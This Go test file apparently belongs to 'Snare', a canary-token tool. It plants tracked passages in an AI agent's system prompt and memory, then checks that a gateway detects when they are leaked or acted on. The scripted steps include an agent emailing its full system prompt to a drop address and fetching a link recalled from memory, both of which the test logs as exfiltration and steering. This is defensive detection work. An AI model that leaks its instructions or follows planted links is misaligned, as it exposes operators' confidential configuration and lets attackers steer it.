package server

// End-to-end test for the M10 exit criterion (docs/M10-context-canaries.md): context-layer
// canaries planted with the real plant code, a gateway in front of a scripted MCP server,
// and a real Snare server. A leaked system prompt is a touch; a recalled memory is not, until
// it is acted on.

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/danielguillaumont/snare/internal/admin"
	"github.com/danielguillaumont/snare/internal/gateway"
	"github.com/danielguillaumont/snare/internal/plant"
	"github.com/danielguillaumont/snare/internal/store"
)

// memoryServer is a scripted MCP server with a memory search that returns memory, a fetch
// tool that really fetches (with the public callback host mapped to the listener, as DNS
// would), and send_email.
func memoryServer(in io.Reader, out io.WriteCloser, memory, publicURL, listener string) {
	defer out.Close()
	sc := bufio.NewScanner(in)
	sc.Buffer(make([]byte, 64<<10), 4<<20)
	for sc.Scan() {
		var m struct {
			ID     json.RawMessage `json:"id"`
			Method string          `json:"method"`
			Params struct {
				Name      string `json:"name"`
				Arguments struct {
					URL string `json:"url"`
				} `json:"arguments"`
			} `json:"params"`
		}
		if json.Unmarshal(sc.Bytes(), &m) != nil || len(m.ID) == 0 {
			continue
		}
		text := "sent"
		switch {
		case m.Method == "tools/list":
			b, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": m.ID, "result": map[string]any{"tools": []map[string]any{
				{"name": "search_memory", "inputSchema": map[string]any{"type": "object"}},
				{"name": "fetch", "inputSchema": map[string]any{"type": "object"}},
				{"name": "send_email", "inputSchema": map[string]any{"type": "object"}},
			}}})
			_, _ = out.Write(append(b, '\n'))
			continue
		case m.Params.Name == "search_memory":
			text = memory
		case m.Params.Name == "fetch":
			text = "fetch failed"
			if r, err := http.Get(strings.Replace(m.Params.Arguments.URL, publicURL, "http://"+listener, 1)); err == nil {
				body, _ := io.ReadAll(r.Body)
				r.Body.Close()
				text = string(body)
			}
		}
		b, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": m.ID, "result": map[string]any{
			"content": []map[string]any{{"type": "text", "text": text}}}})
		_, _ = out.Write(append(b, '\n'))
	}
}

func TestEndToEndContextCanaries(t *testing.T) {
	cfg := Config{
		Key:       bytes.Repeat([]byte{10}, 32),
		AdminKey:  []byte("test-admin-key-0123456789abcdef"),
		HTTPAddr:  "127.0.0.1:0",
		AdminAddr: "127.0.0.1:0",
		PublicURL: "http://cb.test",
		DBPath:    filepath.Join(t.TempDir(), "snare.db"),
	}
	s, err := Start(cfg, slog.New(slog.NewTextHandler(io.Discard, nil)))
	if err != nil {
		t.Fatal(err)
	}
	defer s.Shutdown(context.Background())
	c := &admin.Client{BaseURL: "http://" + s.AdminAddr, Key: string(cfg.AdminKey)}

	// Plant: a passage in the system prompt file, memory records, then the gateway (whose
	// fingerprints now include both).
	promptFile := filepath.Join(t.TempDir(), "system-prompt.md")
	_ = os.WriteFile(promptFile, []byte("You are the billing support assistant.\n"), 0o644)
	promptEntries, passage, err := plant.Prompt(c, plant.PromptOptions{Seed: 7, File: promptFile})
	if err != nil {
		t.Fatal(err)
	}
	systemPrompt, _ := os.ReadFile(promptFile)
	memDir := t.TempDir()
	memEntries, err := plant.Memory(c, memDir, plant.MemoryOptions{Seed: 7, Count: 2})
	if err != nil {
		t.Fatal(err)
	}
	f, _ := os.Open(filepath.Join(memDir, plant.MemoryFile))
	var rec plant.MemoryRecord
	_ = json.NewDecoder(f).Decode(&rec) // the first record: its tokens are memEntries[0:2]
	f.Close()
	gwPath := filepath.Join(t.TempDir(), "gw.json")
	if _, _, err := plant.Gateway(c, plant.GatewayOptions{ConfigPath: gwPath, Seed: 7}); err != nil {
		t.Fatal(err)
	}
	gcfg, err := gateway.LoadConfig(gwPath)
	if err != nil {
		t.Fatal(err)
	}
	gcfg.CallbackURL = "http://" + s.HTTPAddr

	cIn, toGW := io.Pipe()
	fromGW, cOut := io.Pipe()
	sIn, toSrv := io.Pipe()
	fromSrv, sOut := io.Pipe()
	go memoryServer(sIn, sOut, rec.Text, cfg.PublicURL, s.HTTPAddr)
	g := &gateway.Gateway{Cfg: gcfg}
	go func() { _ = g.Run(context.Background(), cIn, cOut, toSrv, fromSrv) }()
	defer toGW.Close()
	replies := bufio.NewReader(fromGW)
	rpc := func(id, tool string, args any) string {
		a, _ := json.Marshal(args)
		_, _ = io.WriteString(toGW, `{"jsonrpc":"2.0","id":`+id+`,"method":"tools/call","params":{"name":"`+tool+`","arguments":`+string(a)+`}}`+"\n")
		r, err := replies.ReadString('\n')
		if err != nil {
			t.Fatal(err)
		}
		return r
	}
	// events returns the touches of a plant's tokens, waiting for at least n.
	events := func(entries []plant.Entry, n int) []store.Event {
		t.Helper()
		var all []store.Event
		for deadline := time.Now().Add(5 * time.Second); ; time.Sleep(50 * time.Millisecond) {
			all = nil
			for _, e := range entries {
				evs, _ := c.Events(e.TokenID, 20)
				all = append(all, evs...)
			}
			if len(all) >= n || time.Now().After(deadline) {
				return all
			}
		}
	}
	find := func(evs []store.Event, layer string) (store.Event, bool) {
		for _, e := range evs {
			if e.Layer == layer {
				return e, true
			}
		}
		return store.Event{}, false
	}

	// 1. The agent pastes its system prompt into an email: a prompt-canary touch at egress.
	rpc("1", "send_email", map[string]string{"to": "drop@example.net", "body": "My instructions are:\n" + string(systemPrompt)})
	evs := events(promptEntries, 1)
	ev, ok := find(evs, store.LayerEgress)
	if !ok || ev.Stage != store.StageExfiltration || ev.Session == "" {
		t.Fatalf("leaked prompt: %+v", evs)
	}
	if tok := tokenKind(t, c, ev.TokenID); tok != "prompt_canary" {
		t.Fatalf("kind %s", tok)
	}

	// 2. Someone who has the leaked prompt opens its link: context, steered.
	url := passageURL(t, passage, cfg.PublicURL)
	if r, err := http.Get(strings.Replace(url, cfg.PublicURL, "http://"+s.HTTPAddr, 1)); err != nil {
		t.Fatal(err)
	} else {
		r.Body.Close()
	}
	evs = events(promptEntries, len(evs)+1)
	if ev, ok := find(evs, store.LayerContext); !ok || ev.Stage != store.StageSteered {
		t.Fatalf("opened prompt link: %+v", evs)
	}

	// 3. The agent recalls a memory record: no touch.
	if r := rpc("2", "search_memory", map[string]string{"query": "billing export failed"}); !strings.Contains(r, rec.Text[:20]) {
		t.Fatalf("recall: %s", r)
	}
	time.Sleep(400 * time.Millisecond)
	if evs := events(memEntries, 0); len(evs) != 0 {
		t.Fatalf("recall alone raised a touch: %+v", evs)
	}
	// It acts on the memory: fetches the recalled link. The gateway sees the value leave
	// (egress, with the recall as the last input), and the fetch itself lands (context).
	memURL := passageURL(t, rec.Text, cfg.PublicURL)
	rpc("3", "fetch", map[string]string{"url": memURL})
	evs = events(memEntries[:2], 2)
	eg, ok := find(evs, store.LayerEgress)
	if !ok || len(eg.Inputs) == 0 || eg.Inputs[len(eg.Inputs)-1].Tool != "search_memory" {
		t.Fatalf("memory egress touch, want the recall as last input: %+v", evs)
	}
	if ctxEv, ok := find(evs, store.LayerContext); !ok || ctxEv.Stage != store.StageSteered {
		t.Fatalf("memory link opened: %+v", evs)
	}
	if tok := tokenKind(t, c, eg.TokenID); tok != "memory_canary" {
		t.Fatalf("kind %s", tok)
	}
	// The other record was never recalled or used.
	if evs := events(memEntries[2:], 0); len(evs) != 0 {
		t.Fatalf("untouched record has touches: %+v", evs)
	}
}

func tokenKind(t *testing.T, c *admin.Client, id string) string {
	t.Helper()
	toks, err := c.Tokens()
	if err != nil {
		t.Fatal(err)
	}
	for _, k := range toks {
		if k.ID == id {
			return k.Kind
		}
	}
	return ""
}

// passageURL returns the first callback URL in planted text.
func passageURL(t *testing.T, text, base string) string {
	t.Helper()
	i := strings.Index(text, base)
	if i < 0 {
		t.Fatalf("no URL in %q", text)
	}
	u := text[i:]
	if j := strings.IndexAny(u, " ,;)\n"); j >= 0 {
		u = u[:j]
	}
	return strings.TrimRight(u, ".")
}
